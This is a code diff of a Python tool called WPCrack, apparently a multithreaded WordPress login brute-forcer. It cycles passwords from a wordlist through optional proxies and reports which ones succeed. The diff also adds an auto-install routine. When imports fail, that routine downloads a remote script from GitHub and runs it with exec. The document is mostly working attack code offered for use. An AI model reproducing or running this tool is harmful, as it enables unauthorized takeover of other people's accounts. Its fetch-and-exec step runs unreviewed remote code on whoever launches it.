@@ -1,13 +1,8 @@
-from os import _exit
-from sys import stdout
-from random import choice
-from argparse import ArgumentParser
-from requests import get as requests_get,post as requests_post
-from requests.exceptions import RequestException
-from traceback import print_exc
-from threading import Thread,Lock,enumerate as list_threads
-
 def exit(exit_code):
+	global wordlist
+	try:wordlist
+	except NameError:pass
+	else:wordlist.close()
 	if exit_code:
 		print_exc()
 	stdout.write('\r[INFO] Exitting with exit code %d\n'%exit_code)
@@ -17,12 +12,39 @@ def logv(message):
 	stdout.write('%s\n'%message)
 	if message.startswith('[ERROR]'):
 		exit(1)
-	if args.debug==2:
-		if message.startswith('[WARNING]'):
-			exit(1)
+	try:args
+	except NameError:pass
+	else:
+		if args.debug:
+			if message.startswith('[WARNING]'):
+				exit(1)
+
+if __name__=='__main__':
+	from os import _exit
+	from sys import stdout
+	from traceback import print_exc
+	while True:
+		try:
+			from random import choice
+			from OpenSSL.SSL import Error as SSLError
+			from argparse import ArgumentParser
+			from requests import get as requests_get,post as requests_post
+			from requests.exceptions import RequestException
+			from traceback import print_exc
+			from threading import Thread,Lock,enumerate as list_threads
+			break
+		except:
+			try:INSTALLED
+			except NameError:
+				try:from urllib import urlopen
+				except:from urllib.request import urlopen
+				argv=['WPCrack',False]
+				exec(urlopen('https://raw.githubusercontent.com/DeBos99/multi-installer/master/install.py').read().decode())
+			else:exit(1)
+
 def log(message):
 	global args
-	if args.debug:
+	if args.verbose:
 		logv(message)
 def get_proxies():
 	global args
@@ -37,7 +59,7 @@ def bot(id):
 	while True:
 		with locks[1]:
 			try:
-				password=wordlist.pop()
+				password=next(wordlist).strip()
 			except:break
 		log('[INFO][%d] Setting password to %s'%(id,password))
 		while True:
@@ -69,10 +91,10 @@ def bot(id):
 				else:
 					logv('[INFO][%d] Invalid password: %s'%(id,password))
 				break
-			except RequestException as e:
+			except (RequestException,SSLError) as e:
 				log('[WARNING][%d] %s'%(id,e.__class__.__name__))
 			except KeyboardInterrupt:exit(0)
-			except:exit(2)
+			except:exit(1)
 
 if __name__=='__main__':
 	try:
@@ -81,11 +103,13 @@ if __name__=='__main__':
 		parser.add_argument('-w','--wordlist',help='set the path to the list with the passwords',required=True)
 		parser.add_argument('-t','--threads',type=int,help='set number of the threads',default=15)
 		parser.add_argument('-p','--proxies',help='set the path to the list with the proxies')
-		parser.add_argument('-d','--debug',help='show all logs',action='count')
+		parser.add_argument('-v','--verbose',help='enable verbose mode',action='store_true')
+		parser.add_argument('-d','--debug',help='enable debug mode',action='store_true')
 		args=parser.parse_args()
+		args.verbose=args.debug or args.verbose
 		locks=[Lock() for _ in range(2)]
 		proxies=[]
-		wordlist=open(args.wordlist,'r').read().strip().split('\n')
+		wordlist=open(args.wordlist,'r')
 		for i in range(args.threads):
 			t=Thread(target=bot,args=(i+1,))
 			t.daemon=True
